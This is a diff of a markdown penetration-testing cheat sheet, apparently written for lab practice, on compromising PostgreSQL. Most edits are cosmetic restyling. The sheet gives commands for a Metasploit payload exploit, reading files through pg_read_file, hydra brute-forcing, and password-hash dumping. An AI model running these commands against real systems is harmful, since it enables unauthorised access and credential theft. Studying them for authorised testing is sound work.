@@ -1,16 +1,16 @@
-# Commands
-### Exploitation via Metasploit:
+# <span style="color:#FF5555">Commands</span>
+### <span style="color:#50FA7B">Exploitation via Metasploit:</span>
 `5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7`
 ```bash
 use exploit(linux/postgres/postgres_payload)
-set RHOST <target-ip>
+set RHOST $VICTIM_IP
 set RPORT 5437
 set LHOST tun0
 run
 ```
-### Manual Access via psql:
+### <span style="color:#50FA7B">Manual Access via psql:</span>
 ```bash
-psql -U postgres -p 5437 -h <target-ip>
+psql -U postgres -p 5437 -h $VICTIM_IP
 ```
 
 ###
@@ -21,29 +21,29 @@ SELECT pg_ls_dir('/home/wilson');
 SELECT pg_read_file('/home/wilson/local.txt');
 ```
 
-### Brute Force Credentials
+### <span style="color:#50FA7B">Brute Force Credentials</span>
 ```bash
-hydra -l username -P passwords.txt <target-ip> postgres
-hydra -L usernames.txt -p password <target-ip> postgres
+hydra -l username -P passwords.txt $VICTIM_IP postgres
+hydra -L usernames.txt -p password $VICTIM_IP postgres
 
 # Metasploit
 msfconsole
 msf> use auxiliary/scanner/postgres/postgres_login
-msf> set rhosts <target-ip>
+msf> set rhosts $VICTIM_IP
 msf> run
 ```
 
-### Dump User Hashes
+### <span style="color:#50FA7B">Dump User Hashes</span>
 ```bash
 msfconsole
 msf> use auxiliary/scanner/postgres/postgres_hashdump
-msf> set rhosts <target-ip>
+msf> set rhosts $VICTIM_IP
 msf> set username <username>
 msf> set password <password>
 msf> run
 ```
 
-## Config File
+## <span style="color:#8BE9FD">Config File</span>
 ```bash
 # Version 14.x
 /etc/postgresql/14/main/postgresql.conf
